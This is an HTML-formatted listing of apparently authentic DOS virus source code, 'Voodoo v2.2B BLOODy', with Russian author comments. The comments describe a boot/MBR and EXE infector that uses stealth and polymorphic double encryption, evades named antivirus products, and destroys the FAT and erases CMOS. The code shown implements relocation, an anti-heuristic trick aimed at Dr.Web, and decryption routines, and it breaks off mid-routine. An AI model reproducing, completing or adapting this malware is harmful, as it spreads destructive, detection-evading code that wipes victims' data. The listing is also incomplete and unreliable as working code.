<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>VOODOO22.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;Voodoo v2.2B BLOODy</span><span class="sc0">
</span><span class="sc1">;(c) by Voodoo/SMF</span><span class="sc0">
</span><span class="sc1">;Вашему вниманию предоставляется исходник из моих последних ТВАРЕниЙ под ДОС.</span><span class="sc0">
</span><span class="sc1">;Пару слов об особенностях этого кода. Прежде всего, это бутовый СМ который</span><span class="sc0">
</span><span class="sc1">;живет в МБР и загрузочных секторах дискет. Кроме того, он "патчит" ЕХЕшки если</span><span class="sc0">
</span><span class="sc1">;они запускаются с диска А. Этот код вполне жизнеспособен в МД9Х. Под NT он не</span><span class="sc0">
</span><span class="sc1">;в силах пробраться в МБР поэтому ему приходиться довольствоваться ЕХЕшками на</span><span class="sc0">
</span><span class="sc1">;флопиках :-( . Но если он все-таки пробрался в МБР расплаты не миновать... ;)</span><span class="sc0">
</span><span class="sc1">;Dr.Web и AVP не детектят его в зашифрованном виде.</span><span class="sc0">
</span><span class="sc1">;Код шифруется дважды. Последний раз код шифруется полиморфным криптовщиком.</span><span class="sc0">
</span><span class="sc1">;Полиморфность на уровне бута не реализована.</span><span class="sc0">
</span><span class="sc1">;Использует стелс прием для маскировки себя в МБР.</span><span class="sc0">
</span><span class="sc1">;Уничтожает FAT и стирает CMOS.</span><span class="sc0">
</span><span class="sc1">;Линкуется в виде COM программы.</span><span class="sc0">
</span><span class="sc1">;==== Cut ====</span><span class="sc0">
</span><span class="sc1">; ====================== Voodoo v2.2B BLOODy ======================</span><span class="sc0">
</span><span class="sc1">; Program       : Voodoo v2.2B</span><span class="sc0">
</span><span class="sc1">; Description   : Boot.MBR.EXE.TSR.Crypt</span><span class="sc0">
</span><span class="sc1">; Last modified : 26.02.2000</span><span class="sc0">
</span><span class="sc1">; Target OS     : MsDOS/Win95/98/NT</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
</span><span class="sc9">INCLUDE</span><span class="sc0">  </span><span class="sc5">MZSTUFF.INC</span><span class="sc0">
</span><span class="sc5">addres01hTR</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">ReloCS</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">filesize</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">addres01hTR</span><span class="sc0">  </span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">dwr</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">filesize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Dkr</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">dwr</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">sizeDkr</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">c11</span><span class="sc4">-</span><span class="sc5">decript</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc5">Dkr</span><span class="sc4">+</span><span class="sc5">sizeDkr</span><span class="sc0">
                    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">BEGIN</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">next_1</span><span class="sc0">
  </span><span class="sc5">next_1</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
 </span><span class="sc5">OFFFSET</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc5">oldCS__</span><span class="sc4">-</span><span class="sc5">next_1</span><span class="sc0">
 </span><span class="sc5">OFFFSET1</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc5">oldES__</span><span class="sc4">-</span><span class="sc5">next_1</span><span class="sc0">
                    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">
                    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">OFFFSET1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">
                    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">OFFFSET</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4321h</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@AlocMem</span><span class="sc0">
          </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc2">103H</span><span class="sc0">
          </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">RET2EXE</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
 </span><span class="sc5">Mov_ES_0000h</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
 </span><span class="sc5">Get_FDD_Param</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">add_constant</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">oldCS__K</span><span class="sc0">  </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldCS__</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">add_constant</span><span class="sc0">
</span><span class="sc5">RET2EXEfrom</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">103h</span><span class="sc0">
</span><span class="sc5">RET2EXE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">oldCS__K</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;es</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc1">;start seg</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;reloSS</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;oldSP</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">FuckuDrweb3</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">oldIP__</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">oldCS__</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">oldSS__</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">oldSP__</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">oldES__</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">MemLimit</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc2">01ffH</span><span class="sc0">
</span><span class="sc1">;###################################</span><span class="sc0">
</span><span class="sc1">;Выделяем память для наших нужд</span><span class="sc0">
</span><span class="sc5">@AlocMem</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">48H</span><span class="sc0">
                    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">MemLimit</span><span class="sc0">
                    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                    </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">@Next01</span><span class="sc0">
                    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">49H</span><span class="sc0">
                    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">48H</span><span class="sc0">
                    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0FFFFH</span><span class="sc0">
                    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">MemLimit</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
                    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">48H</span><span class="sc0">
                    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@AlocMem</span><span class="sc0">
   </span><span class="sc5">@Next01</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
                    </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0C7H</span><span class="sc4">,</span><span class="sc2">06H</span><span class="sc4">,</span><span class="sc2">01H</span><span class="sc4">,</span><span class="sc2">00H</span><span class="sc4">,</span><span class="sc2">08H</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0"> </span><span class="sc1">; Volum System</span><span class="sc0">
                    </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc0">
                    </span><span class="sc6">INC</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">
                    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">;ES=NEW_SEG</span><span class="sc0">
         </span><span class="sc1">;----------------------------------</span><span class="sc0">
         </span><span class="sc1">; Перенесем себя в NEW_Seg</span><span class="sc0">
          </span><span class="sc5">sizeBady</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc5">@End</span><span class="sc4">-</span><span class="sc5">BEGIN</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">sizeBady</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">          </span><span class="sc1">; es:di&lt;--ds:si</span><span class="sc0">
</span><span class="sc1">;-----------------------------------</span><span class="sc0">
</span><span class="sc1">;              call next@</span><span class="sc0">
</span><span class="sc1">;              db 't.EXE$',0</span><span class="sc0">
</span><span class="sc1">;              next@: pop si</span><span class="sc0">
</span><span class="sc1">;              mov di,filename</span><span class="sc0">
</span><span class="sc1">;              mov cx,13</span><span class="sc0">
</span><span class="sc1">;              rep movsb</span><span class="sc0">
</span><span class="sc1">;----------------------------------</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Next_Code1</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">retf</span><span class="sc0">
         </span><span class="sc1">;------------------------------------</span><span class="sc0">
</span><span class="sc5">Next_Code1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;anti web cripting</span><span class="sc0">
</span><span class="sc5">keyCRC2offset</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc5">keyCRC2offset_</span><span class="sc4">-</span><span class="sc5">begin</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">sizeVCRC2</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc5">@end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">beginer</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Анти еврестический прием против вЕБА   ("как два байта ...")</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc0">  </span><span class="sc1">; 0:46ch биосовские тики от таймера.</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">sizeVCRC2</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc2">1234h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">beginer</span><span class="sc0">
</span><span class="sc5">@ql</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">keyCRC2offset_</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0dh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">real_code</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FuckuDrweb2</span><span class="sc0">  </span><span class="sc1">; для вЕБ всегда "иквыл"  :-P</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">FuckuDrweb2</span><span class="sc0"> </span><span class="sc1">; посылаем его на 0FFFFH:0000H</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@ql</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc5">real_code</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@ql</span><span class="sc0">
</span><span class="sc5">level2decript</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">beginer</span><span class="sc4">-</span><span class="sc5">begin</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">Next_Code</span><span class="sc0">
</span><span class="sc5">beginer</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">fileATR</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">9999h</span><span class="sc0">
</span><span class="sc5">keyCRC2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">keyCRC</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">hendler</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">desh_size</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
    </span><span class="sc5">int21h</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">82h</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc1">; Сырец расшифровщика.</span><span class="sc0">
</span><span class="sc5">decript2</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc5">k1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc5">k2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc5">k3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">k4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0dh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc5">k5</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">FuckuDrweb</span><span class="sc0">
</span><span class="sc5">decript</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">cc1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">cc2</span><span class="sc0">
    </span><span class="sc5">cc2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc1">; r2   push di si +3 +4</span><span class="sc0">
    </span><span class="sc5">cc3</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">sizeBady</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc5">C1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc5">C2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc5">C3</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
</span><span class="sc5">L1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">cc4</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc5">C4</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">C5</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1111h</span><span class="sc0">
    </span><span class="sc5">C6</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc5">C7</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc5">C8</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc5">C9</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc5">C10</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">L1</span><span class="sc0">
    </span><span class="sc5">C11</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">
      </span><span class="sc5">MORFSIZE</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc1">; Длинна случайного джампа в декрипторе.</span><span class="sc0">
</span><span class="sc5">randmrs</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">MORFSIZE</span><span class="sc0">
           </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
           </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
           </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">RANDOM</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">OPTIMAZI</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0ebh</span><span class="sc0">
